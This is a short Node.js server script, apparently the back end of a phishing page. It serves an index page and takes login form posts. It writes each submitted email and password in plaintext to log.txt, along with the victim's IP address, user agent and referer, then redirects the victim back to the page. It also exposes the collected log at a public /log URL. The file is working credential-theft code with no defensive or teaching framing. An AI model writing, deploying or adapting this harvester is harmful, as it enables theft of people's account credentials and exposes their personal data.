var fs = require('fs');
var http = require('http');
var url = require('url');

var PORT = process.env.PORT || 3000;

var isMobile = function(req) {
    console.log(req.headers);
    return (new RegExp('Mobile', 'gi')).test(req.headers['user-agent']);
}

http.createServer(function(req, res){
    var url = req.url;
    var mobile = isMobile(req);
    if (req.url === '/favicon.ico') {
        //res.writeHead(200, {'Content-Type': 'image/x-icon'} );
        //res.end();
        //console.log('favicon requested');
        return;
    }
    console.log(req.url);
    if(url === '/') {
        serveFile('/public/index', res);
    } 
    else if(url === '/login'){
        console.log('Method: '+req.method);
        if(req.method === 'POST'){
            processData(req, res);
        }
    }
    else if(url === '/log') {
        serveFile('/log', res, '.txt');
    }
    else {
        res.end('Not Found');
    }

}).listen(PORT, function(){
    console.log('Server Listening: '+PORT);
});

function serveFile(path, res, fext) {
    var ct;
    if(!fext) {
        fext = '.html';
        ct = 'text/html'; 
    } else {
        ct = 'text/plain';
    }
    fs.readFile('.'+path+fext, function(err, data){
        if(err) return console.log(err);
        res.writeHead(200, {'Content-Type': ct});
        res.write(data);
        res.end();
    });
}


function processData(req, res) {
    var body = '';
    req.on('data', function (data) {
        body += data;
        console.log("Partial body: " + body);
    });

    req.on('end', function () {
        console.log("Body: " + body);
        var s = body.split(/[\=|\&]/);
        req.body = {};
        for(var i=0; i<s.length; i++) {
            if(i%2!=0) {
                //console.log(s[i-1],s[i]);
                req.body[s[i-1]] = s[i];
            }
        }
        console.log(req.body);

        var log =   '\n\ndate: '+new Date()
                    +'\nreferer: '+req.headers['referer']
                    +'\nurl: '+req.url
                    +'\nip: '+ (req.headers['x-forwarded-for'] || req.connection.remoteAddress)
                    +'\nua: '+req.headers['user-agent']
                    +'\nemail: '+req.body.Email
                    +'\npassword: '+req.body.Pass

        fs.appendFile('log.txt', log, function(err){
            if(err) return console.log(err);
            console.log('Data saved');
            res.end('Logged');
        });

        res.writeHead(302, {'Location': '/'});
        res.end();
    });
}
